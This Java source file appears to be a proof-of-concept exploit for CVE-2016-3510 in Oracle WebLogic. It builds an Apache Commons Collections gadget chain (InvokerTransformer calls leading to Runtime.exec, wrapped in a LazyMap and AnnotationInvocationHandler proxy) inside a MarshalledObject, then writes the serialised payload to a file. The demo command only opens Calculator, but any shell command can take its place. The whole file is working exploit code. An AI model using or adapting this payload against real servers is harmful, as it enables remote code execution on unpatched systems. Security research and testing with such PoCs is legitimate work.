package com.weblogcVul;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import weblogic.corba.utils.MarshalledObject;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CVE_2016_3510 {    public static Object getObject() throws IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, ClassNotFoundException {
    String          cmd         = "open /System/Applications/Calculator.app";
    Transformer[]   tarray      = new Transformer[]
            {
                    new ConstantTransformer( Runtime.class ),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/bash", "-c", cmd}})
            };
    Transformer         tchain      = new ChainedTransformer( tarray );
    Map normalMap   = new HashMap();
    Map                 lazyMap     = LazyMap.decorate( normalMap, tchain );
    Class               clazz       = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
    Constructor cons        = clazz.getDeclaredConstructor( Class.class, Map.class );
    cons.setAccessible( true );
    InvocationHandler ih          = ( InvocationHandler )cons.newInstance( Override.class, lazyMap );
    Map                 mapProxy    = ( Map ) Proxy.newProxyInstance
            (
                    Map.class.getClassLoader(),
                    new  Class[] { Map.class },
                    ih
            );
    Object              obj         = cons.newInstance( Override.class, mapProxy );
    return obj;
}
    public static void main(String[] args) throws IOException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        FileOutputStream fileOutputStream = new FileOutputStream("/tmp/cve-2016-3510.ser");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        weblogic.corba.utils.MarshalledObject marshalledObject = new MarshalledObject(CVE_2016_3510.getObject());
        objectOutputStream.writeObject(marshalledObject);
        objectOutputStream.close();
    }
}
